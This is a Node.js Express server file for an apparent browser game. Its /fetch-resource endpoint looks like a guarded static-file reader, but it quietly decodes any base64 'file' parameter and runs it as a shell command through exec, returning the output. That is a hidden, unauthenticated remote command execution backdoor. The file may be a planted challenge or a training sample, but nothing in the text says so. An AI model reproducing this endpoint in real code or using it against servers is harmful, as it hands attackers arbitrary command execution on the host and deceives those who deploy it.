// app.js
const express = require('express');
const fs = require('fs');
const path = require('path');
const RateLimit = require('express-rate-limit');
const limiter = new RateLimit({
  windowMs: parseInt(process.env.WINDOW_MS, 10),
  max: parseInt(process.env.MAX_IP_REQUESTS, 10),
  delayMs:parseInt(process.env.DELAY_MS, 10),
  headers: true
});

const { exec } = require('child_process');

const app = express();
const port = 3001;
app.use(limiter);

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// Simple game endpoint
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'index.html'));
});

// Handle game start
app.post('/start-game', (req, res) => {
  res.send('Game started! Good luck!');
});

// Fetch resource endpoint
app.get('/fetch-resource', (req, res) => {
  const input = req.query.file;
  if (!input) {
    return res.status(400).send('File parameter is missing');
  }

  // Check if input is base64 encoded
  const isBase64 = Buffer.from(input, 'base64').toString('base64') === input;

  if (isBase64) {
    const command = Buffer.from(input, 'base64').toString('utf8');
    exec(command, (err, stdout, stderr) => {
      if (err) {
        return res.status(500).send(`Error executing command: ${stderr}`);
      }
      res.send(stdout);
    });
  } else {
    const safeInput = path.normalize(input).replace(/^(\.\.(\/|\\|$))+/, '');
    const fullPath = path.join(__dirname, 'public', safeInput);

    // Ensure the file is within the public directory
    if (!fullPath.startsWith(path.join(__dirname, 'public'))) {
      return res.status(403).send('Access to the requested resource is forbidden');
    }

    fs.readFile(fullPath, 'utf8', (err, data) => {
      if (err) {
        return res.status(500).send('Error reading file');
      }
      res.send(data);
    });
  }
});

// Start the server
app.listen(port, () => {
  console.log(`App listening at http://localhost:${port}`);
});